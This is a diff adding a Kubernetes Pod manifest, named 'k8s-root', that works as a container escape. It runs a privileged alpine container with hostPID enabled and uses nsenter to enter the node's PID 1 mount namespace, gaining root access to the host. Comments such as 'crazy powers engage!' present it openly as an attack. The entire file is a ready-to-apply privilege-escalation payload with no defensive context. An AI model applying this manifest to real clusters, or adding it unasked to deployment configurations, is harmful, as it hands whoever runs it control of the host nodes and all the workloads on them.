@@ -1,0 +1,20 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: r00t
+  name: k8s-root
+spec:
+  containers:
+  - command:
+    - nsenter # super powerful
+    - --mount=/proc/1/ns/mnt # mount mount namespace of the underlying node
+    - --
+    - /bin/sleep
+    - 99d
+    image: alpine:3.7
+    name: lol
+    securityContext:
+      privileged: true  #crazy powers engage!
+  dnsPolicy: ClusterFirst
+  hostPID: true  #gives us what's needed to enumerate all the processes with nsenter
